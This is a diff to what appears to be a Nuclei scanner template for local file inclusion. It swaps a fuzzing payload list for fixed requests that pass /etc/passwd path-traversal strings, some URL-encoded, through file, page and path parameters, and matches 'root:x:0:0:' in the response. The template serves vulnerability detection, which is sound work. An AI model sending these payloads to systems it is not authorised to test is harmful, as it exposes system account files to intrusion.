@@ -7,21 +7,15 @@ info:
 http:
   - method: GET
     path:
-      - "{{BaseURL}}"
-    payloads:
-      lfi_payloads:
-        - "/etc/passwd"
-        - "../../../../../etc/passwd"
-        - "/../../../../../../../../etc/passwd"
-        - "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "{{BaseURL}}?file=/etc/passwd"
+      - "{{BaseURL}}?page=/etc/passwd"
+      - "{{BaseURL}}?path=/etc/passwd"
+      - "{{BaseURL}}?file=../../../../../../../../etc/passwd"
+      - "{{BaseURL}}?page=../../../../../../../../etc/passwd"
+      - "{{BaseURL}}?path=../../../../../../../../etc/passwd"
+      - "{{BaseURL}}?file=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
 
-    fuzzing:
-      - part: query
-        type: replace
-        mode: multiple
-        fuzz:
-          - "{{lfi_payloads}}"
-
+    stop-at-first-match: true
     matchers-condition: and
     matchers:
       - type: status
@@ -32,7 +26,6 @@ http:
         part: body
         regex:
           - "root:x:0:0:"
-        condition: and
 
       - type: word
         part: body
@@ -42,6 +35,7 @@ http:
           - "tutorial"
           - "placeholder"
           - "syntax"
+          - "W3Schools"
 
     extractors:
       - type: regex
